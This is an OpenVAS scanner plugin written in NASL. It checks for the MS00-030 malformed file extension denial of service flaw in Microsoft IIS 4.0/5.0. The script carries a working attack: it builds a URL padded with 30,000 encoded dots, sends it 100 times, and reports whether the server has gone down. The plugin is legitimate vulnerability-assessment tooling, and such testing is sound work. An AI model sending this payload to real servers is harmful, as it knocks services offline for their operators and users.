###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms00-30_remote.nasl 12 2013-10-27 11:15:33Z jan $
#
# Microsoft IIS Malformed File Extension Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could slow the servers response or stop it altogether.
  Impact Level: Application";
tag_affected = "Microsoft Internet Information Server 4.0/5.0";
tag_insight = "The flaw is due to error in IIS, If a malicious user request a file
  from a web server via an URL containing specially malformed file extension
  data, the server will become unresponsive for some period of time.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link.
  http://technet.microsoft.com/en-us/security/bulletin/ms00-030";
tag_summary = "This host is missing important security update according to
  Microsoft Bulletin MS00-030.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802439";
CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_bugtraq_id(1190);
  script_cve_id("CVE-2000-0408");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"creation_date", value:"2012-07-03 16:55:41 +0530 (Tue, 03 Jul 2012)");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_name("Microsoft IIS Malformed File Extension Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "


  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.ussrback.com/labs40.html");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms00-030");
  script_xref(name : "URL" , value : "http://www.iss.net/security_center/reference/vuln/iis-url-extension-data-dos.htm");

  script_description(desc);
  script_summary("Check for Denial of Service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("IIS/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

iisPort = "";
banner = "";
req = "";

if(!iisPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

if(!get_port_state(iisPort)){
  exit(0);
}

## Construct the attack request
file = "/%69%6E%64%78" + crap(data:"%2E", length:30000) + "%73%74%6D";
req = http_get(item:file, port:iisPort);

## Send the constructed request multiple times
for(i=0; i<100; i=i+1)
{
  soc = http_open_socket(iisPort);
  if(!soc){
    exit(0);
  }

  send(socket:soc, data:req);
  http_close_socket(soc);
}

sleep(3);

if(http_is_dead(port:iisPort)){
  security_warning(iisPort);
}
